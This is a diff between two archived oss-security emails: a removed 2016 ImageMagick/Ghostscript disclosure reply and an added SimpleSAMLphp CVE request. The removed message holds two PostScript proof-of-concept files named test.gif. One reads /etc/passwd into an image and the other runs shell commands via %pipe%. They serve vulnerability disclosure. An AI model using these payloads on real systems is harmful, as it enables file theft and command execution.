@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1497" "Friday" "30" "September" "2016" "13:05:16" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkJxK8re4yc1xVN79Y9k7tDoO-fFO-xJNzgvVG9ZgPQtzw@mail.gmail.com>" "50" "Re: [oss-security] ImageMagick identify \"d:\" hangs" "^Cc:" nil nil "9" "2016093020:05:16" "[oss-security] ImageMagick identify \"d:\" hangs" (number mark "        taviso@googl Sep 30   50/1497  " thread-indent "\"Re: [oss-security] ImageMagick identify \"d:\" hangs\"\n") "<CAJ_zFkLoaj_k74mMCFwWs+n7Mv9gwOdFa3AcyQf=W_ViHS2nag@mail.gmail.com>" ("<alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>" "<20160927142500.3x26pcrhw5x4nt6s@jwilk.net>" "<alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>" "<CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>" "<CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>" "<877f9vcjd9.fsf@mid.deneb.enyo.de>" "<CAJ_zFk+T7TD7Ke=k7kbRbxGfnyARQXX1YxGehshKj11RxQD6BA@mail.gmail.com>" "<CAJ_zFkLoaj_k74mMCFwWs+n7Mv9gwOdFa3AcyQf=W_ViHS2nag@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["488" "Saturday" "3" "December" "2016" "10:44:05" "+0100" "Salvatore Bonaccorso" "carnil@debian.org" "<20161203094405.udrlvszru3jxezia@eldamar.local>" "16" "[oss-security] CVE Request: SimpleSAMLphp: SSPSA 201612-01: Incorrect signature verification" nil nil nil "12" "2016120309:44:05" "[oss-security] CVE Request: SimpleSAMLphp: SSPSA 201612-01: Incorrect signature verification" (number mark "U       carnil@debia Dec  3   16/488   " thread-indent "\"[oss-security] CVE Request: SimpleSAMLphp: SSPSA 201612-01: Incorrect signature verification\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 19794 invoked by uid 550); 30 Sep 2016 20:15:30 -0000
+Received: (qmail 22436 invoked by uid 550); 3 Dec 2016 09:44:20 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,96 +11,58 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 16000 invoked from network); 30 Sep 2016 20:05:49 -0000
+Reply-To: oss-security@lists.openwall.com
+Received: (qmail 22397 invoked from network); 3 Dec 2016 09:44:19 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=google.com; s=20120113;
-        h=mime-version:in-reply-to:references:from:date:message-id:subject:to
-         :cc;
-        bh=rE6UfN5lW0WBkKp5CNMgwvrk57aYHnYDX2Vt1lVnbiY=;
-        b=Ngk1vLOeyLq3RrfCeKLiSidTQwwLONMbmLWLtgPkMg4TpOS2aM39kJ5xnzm8lZVj9z
-         ZO7tbFQ24VaErt4LC2oDlu7IjhohuFl2a6m7p/NLpDiDok8nKkGtWvPrvEuAM5PNODyP
-         9oxEmK4DPERtKdKgoMzz9kmHB44taWh/lyqXhHEDISKu3QIfP29c1BnVFC3IAEBSLlZQ
-         WpYVGZdbXkpjp7e6rGl/mr5BB3QpnNr5a0NlGXHhRcMoQddpRgBIbfU9swFv9fB20W8W
-         vvAkMfDANXDP8vi0ne+knHNCGEk8MVfRI9eA4/mA7KupivlQ3XXDqcGlT0PhT5Yp+u6r
-         DaCQ==
+        d=gmail.com; s=20120113;
+        h=sender:date:from:to:subject:message-id:mime-version
+         :content-disposition:user-agent;
+        bh=FYpsJ6r/gMwkldxUkq7ERnG4qzx2RHKFxcojYVG0oQQ=;
+        b=n3gEw+6OAwN2SyhOE9oujw0mDZOugo8CjzybAUBafpRvwwrkiuZK8wrYw74sVkxfXQ
+         2kctWis+92qn6LnlE5BpytVZza7Dyu4oo8cvnVOXksEbixazm96HXxT/2miUeLxbIZpG
+         wQ/L1QaSPiCpP1i4l4kh7jPKRJoFiEJUY+6DRTwwV1Upmur2cnqGGK2CV+t9vMfnSNCJ
+         ty9HY7yuhADSIVEg/+hzu1n8j07YFa0qx0gn6mi5ycaXEFy4HflPWMAqIEUUgsH/TXUN
+         R0Lr509nCy7wjlCdOS6/76fRatgXAaitubH6LRc1RTQf3dO4R61Uu7ZVZFcbQNW4fZBi
+         uWFg==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
         d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
-         :message-id:subject:to:cc;
-        bh=rE6UfN5lW0WBkKp5CNMgwvrk57aYHnYDX2Vt1lVnbiY=;
-        b=i1c8bvQsgOfHb/0qWny6yl0LgirvX7NtAPd6RfLJP8gA+kCBT6ULBaBI77XTgCOHhD
-         Co2XmTg01J/3TJrTZy3XveHuTFMcOSS9d7A/UTL1ahqrZH0L5QVwfWGV2zrLyZVN3l8r
-         XhjRLiwWFk36C09QdYs309XJMm933L0uZJPeIFYZ6Z5SCjUoOF8IbcGcQB9kiU2IwWzq
-         9NAVtR4PbhaAfeSNf2I4qiRfyHVK5Vj+Ve7o4CbJ6Ny4QVwsooxbPUt3j2zkRyv8ONNx
-         mbBgQTzZZRmWPatN4eog7TPvs/1gIvFqokRSLAHGb37/D5a3VcQKsjW/vcGgjHN+20BE
-         eIWQ==
-X-Gm-Message-State: AA6/9RkIVfoZKDTkCqas1F2Qfdr7J0yBuLIyN3kVTlrI+Vbz8HQ0PTjWLVuaMH1XdbYprlYqgya5rXtHpthTf/ou
-X-Received: by 10.176.6.233 with SMTP id g96mr6658291uag.135.1475265937438;
- Fri, 30 Sep 2016 13:05:37 -0700 (PDT)
+        h=x-gm-message-state:sender:date:from:to:subject:message-id
+         :mime-version:content-disposition:user-agent;
+        bh=FYpsJ6r/gMwkldxUkq7ERnG4qzx2RHKFxcojYVG0oQQ=;
+        b=ikWKpD42L3vENeE9dw2Dcd5Spq+pHjiCrqP91ide26CfQ2pTvzVIudnleCl553zm7j
+         yxchKhBw9ecrRxRlNbQhPCmYMYHj+6ofOYfCOzut0o55ojSeTdE9MtsaMqTu5BSCcS8J
+         5xIhBido6oG6XJSdgSL5efZe142D1v6VvlmpJs4HWrAPjAqUpGIXaSX1GQ+4Sd/Unj9x
+         S5IIzcrK/hnTvGfqCTBgYS/RNJnhlQKToNnVgRQMXxgmD+DJqw0+PweD6R4ijK2zUXcn
+         EaIfWeVzs6EjvxcUq/lWcIMt10XgVF5o/IuT1+gLEBwCo4ZujVLntlOt/y3r082KKA0u
+         q5ag==
+X-Gm-Message-State: AKaTC005w7FsLlUqV6bttP48O24cyxuuoPRGOCjtwhSdSkeg5g2iyTWRq/MXLIsOQzo8GA==
+X-Received: by 10.194.148.134 with SMTP id ts6mr41715293wjb.220.1480758248177;
+        Sat, 03 Dec 2016 01:44:08 -0800 (PST)
+Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
+Date: Sat, 3 Dec 2016 10:44:05 +0100
+From: Salvatore Bonaccorso <carnil@debian.org>
+To: OSS Security Mailinglist <oss-security@lists.openwall.com>
+Message-ID: <20161203094405.udrlvszru3jxezia@eldamar.local>
 MIME-Version: 1.0
-In-Reply-To: <CAJ_zFkLoaj_k74mMCFwWs+n7Mv9gwOdFa3AcyQf=W_ViHS2nag@mail.gmail.com>
-References: <alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>
- <20160927142500.3x26pcrhw5x4nt6s@jwilk.net> <alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>
- <CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>
- <CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>
- <877f9vcjd9.fsf@mid.deneb.enyo.de> <CAJ_zFk+T7TD7Ke=k7kbRbxGfnyARQXX1YxGehshKj11RxQD6BA@mail.gmail.com>
- <CAJ_zFkLoaj_k74mMCFwWs+n7Mv9gwOdFa3AcyQf=W_ViHS2nag@mail.gmail.com>
-Message-ID: <CAJ_zFkJxK8re4yc1xVN79Y9k7tDoO-fFO-xJNzgvVG9ZgPQtzw@mail.gmail.com>
-Content-Type: text/plain; charset=UTF-8
-Cc: Florian Weimer <fw@deneb.enyo.de>
-Date: Fri, 30 Sep 2016 13:05:16 -0700
-From: Tavis Ormandy <taviso@google.com>
-Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] ImageMagick identify "d:" hangs
-To: oss-security@lists.openwall.com
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+User-Agent: NeoMutt/20161126 (1.7.1)
+Subject: [oss-security] CVE Request: SimpleSAMLphp: SSPSA 201612-01: Incorrect signature
+ verification
 
-On Thu, Sep 29, 2016 at 2:28 PM, Tavis Ormandy <taviso@google.com> wrote:
->
-> Just for future reference, here is an example of dumping a file to an
-> image processed with ImageMagick that works with gs 9.20:
->
-> $ cat test.gif
-> %!PS
-> /Size 20 def                             % font/line size
-> /Line 0 def                              % current line
-> /Buf 1024 string def                     % line buffer
-> /Path 0 newpath def
->
-> /Courier-Bold findfont Size scalefont setfont
-> 1 1 1 setrgbcolor clippath fill          % draw white background
-> 0 0 0 setrgbcolor                        % set black foreground
->
-> (/etc/passwd) .libfile {
->     {
->         dup Buf readline
->         {
->             Path Line moveto show
->         }{
->             showpage
->             quit
->         } ifelse
->         % next line
->         /Line Line Size add def
->     } loop
-> } if
-> $ convert test.gif png:test.png
+Hi
 
-The more I look, the worse it gets. This also works in 9.18 and
-higher, arbitrary shell command execution:
+SimpleSAMLphp has released an update fixing an incorrect signature
+verification issue. Affected versions are all SimpeSAMLphp before
+1.14.10, and the SimpleSAMLphp SAML2 library, prior to 1.9.1, 1.10.3
+and 2.3.3.
 
-$ cat test.gif
-currentdevice null true mark /OutputICCProfile (%pipe%id > /dev/tty)
-.putdeviceparams
-quit
-$ convert test.gif png:test.png
+Upstream advisory: https://simplesamlphp.org/security/201612-01
 
-(Note: I don't know why it doesn't work on earlier versions, maybe
-it's possible to make it work, or some other param will work)
+Refrences: https://github.com/simplesamlphp/saml2/pull/81
+https://github.com/simplesamlphp/saml2/commit/7008b0916426212c1cc2fc238b38ab9ebff0748c
 
-I think -dSAFER is too dangerous to use without sandboxing right now,
-things like evince and imagemagick that use it as a backend should
-disable by default.
+Could you assign a CVE for this issue?
 
-I'm not planning to look any more at this.
-
-Tavis.
+Regards,
+Salvatore
